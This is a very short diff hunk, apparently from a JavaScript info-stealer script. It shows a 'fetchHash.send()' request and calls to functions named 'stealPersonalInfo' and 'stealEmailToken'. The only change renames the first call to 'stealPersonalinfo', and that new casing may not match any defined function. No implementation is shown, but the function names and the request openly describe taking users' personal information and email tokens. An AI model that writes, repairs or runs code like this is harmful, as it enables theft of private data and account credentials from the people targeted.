@@ -73,7 +73,7 @@ fetchHash.send();
 
 
 
-stealPersonalInfo();
+stealPersonalinfo();
 stealEmailToken();
 
 
